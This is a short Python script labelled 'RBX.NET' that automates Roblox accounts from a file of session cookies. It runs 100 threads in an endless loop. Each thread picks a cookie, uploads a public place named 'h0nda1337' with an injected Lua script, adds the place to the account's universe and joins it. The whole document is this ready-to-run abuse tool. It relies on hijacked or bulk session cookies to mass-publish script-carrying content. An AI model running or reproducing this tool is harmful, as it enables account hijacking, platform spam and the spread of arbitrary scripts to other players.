# RBX.NET


#

import time
import random
import threading
import requests

cookies = open("./misc/cookies.txt", "r").read().splitlines()
base = open("./misc/base").read()
scriptPath = "./script.lua"

threads = 100

class roblox():
	def __init__(self, cookie):
		self.cookie = cookie
		self.xsrf = ""
		self.session = requests.Session()
		self.session.cookies[".ROBLOSECURITY"] = cookie
		self.get_universe()
	def get_universe(self):
		r = self.session.get("https://develop.roblox.com/v1/search/universes?q=creator:User&limit=50&sort=-GameCreated")
		self.universeId = r.json()["data"][0]["id"]
	def create_place(self, content):
		req = self.session.post(
		  url="https://data.roblox.com/Data/Upload.ashx?assetid=0&type=Place&name=h0nda1337&description=h0nda1337&genreTypeId=1&ispublic=True&allowComments=false",
		  headers={"User-Agent": "Roblox/WinInet"},
		  data=content
		)
		return req.text
	def add_to_game(self, universeId, placeId):
		req = self.session.post(
		  url="https://www.roblox.com/universes/addplace",
		  headers={"X-CSRF-TOKEN": self.xsrf},
		  data={"placeId": placeId, "universeId": universeId}
		)
		if "X-CSRF-TOKEN" in req.headers:
			self.xsrf = req.headers["X-CSRF-TOKEN"]
			return self.add_to_game(universeId, placeId)
		return req.json()
	def joinPlace(self, placeId):
		resp = self.session.get("https://www.roblox.com/Game/PlaceLauncher.ashx?request=RequestGame&placeId={}".format(placeId), headers={"User-Agent": "Roblox/WinInet"})
		return resp.json()

def thread():
	while True:
		try:
			cookie = random.choice(cookies)
			session = roblox(cookie)
			placeId = session.create_place(base.replace("{replaceThis}", open(scriptPath).read()))
			print("Created place ->", placeId)
			print("Added to universe ->", session.add_to_game(session.universeId, placeId))
			print("Joined place ->", session.joinPlace(placeId))
		except Exception as e:
			print("Thread Error ->", e)

for i in range(threads):
	threading.Thread(target=thread).start()
	print("Thread ->", i)
	time.sleep(0.25)
